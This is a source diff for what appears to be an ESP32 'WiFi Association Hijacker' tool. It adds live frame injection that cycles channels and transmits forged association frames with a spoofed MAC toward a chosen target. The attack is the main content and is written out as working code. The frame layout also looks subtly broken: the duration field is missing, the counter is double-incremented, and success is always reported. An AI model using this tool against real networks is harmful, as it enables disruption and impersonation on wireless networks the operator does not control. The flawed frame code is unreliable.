@@ -14,7 +14,7 @@ namespace WiFiAssociationHijacker {
 HijackResult hijackAssociation(const String &targetMAC, uint32_t durationMs) {
     HijackResult result{false, targetMAC, "", 0};
 
-    Serial.println("\n=== WiFi Association Hijacker ===");
+    Serial.println("\n=== WiFi Association Hijacker (Real Frame Injection) ===");
     Serial.println("Target MAC: " + targetMAC);
     Serial.println("Duration: " + String(durationMs) + "ms");
 
@@ -48,9 +48,42 @@ HijackResult hijackAssociation(const String &targetMAC, uint32_t durationMs) {
         g_assocCount++;
         // Association frame transmission via esp_wifi_80211_tx
 
-        if (g_assocCount % 5 == 0) {
-            Serial.println("  [" + String(g_assocCount) + "] association attempts");
+        if (now >= nextChannelSwitch) {
+            uint8_t ch = channels[channelIdx % 3];
+            esp_wifi_set_channel(ch, WIFI_SECOND_CHAN_NONE);
+            channelIdx++;
+            nextChannelSwitch = now + 1000;
+            Serial.printf("  Channel switched to %d\n", ch);
         }
+
+        uint8_t targetAddr[6];
+        sscanf(targetMAC.c_str(), "%02hhx:%02hhx:%02hhx:%02hhx:%02hhx:%02hhx",
+               &targetAddr[0], &targetAddr[1], &targetAddr[2],
+               &targetAddr[3], &targetAddr[4], &targetAddr[5]);
+
+        uint8_t assocFrame[26];
+        assocFrame[0] = 0x00;
+        assocFrame[1] = 0x00;
+        memcpy(&assocFrame[2], targetAddr, 6);
+        memcpy(&assocFrame[8], spoofMAC, 6);
+        memcpy(&assocFrame[14], targetAddr, 6);
+        assocFrame[20] = (g_assocCount & 0xFF);
+        assocFrame[21] = ((g_assocCount >> 8) & 0xFF);
+        assocFrame[22] = 0x10;
+        assocFrame[23] = 0x00;
+        assocFrame[24] = 0x01;
+        assocFrame[25] = 0x00;
+
+        esp_err_t ret = esp_wifi_80211_tx(WIFI_IF_STA, assocFrame, sizeof(assocFrame), false);
+        if (ret == ESP_OK) {
+            g_assocCount++;
+
+            if (g_assocCount % 5 == 0) {
+                Serial.printf("  [%d] association frames transmitted\n", g_assocCount);
+            }
+        }
+
+        delay(100);
     }
 
     g_hijackActive = false;
@@ -59,9 +92,8 @@ HijackResult hijackAssociation(const String &targetMAC, uint32_t durationMs) {
     result.success = true;
     result.associationsCount = g_assocCount;
 
-    Serial.println("✓ Hijacking complete");
-    Serial.println("Spoofed MAC: " + result.spoofedMAC);
-    Serial.println("Attempts: " + String(g_assocCount));
+    Serial.println("✓ Association hijacking complete");
+    Serial.printf("Total frames sent: %d\n", result.associationsCount);
 
     ResultsDisplay::showResult("Tool", {"Tool", "Complete", 100, {"Success"}, ResultsDisplay::ResultType::SUCCESS});
     return result;
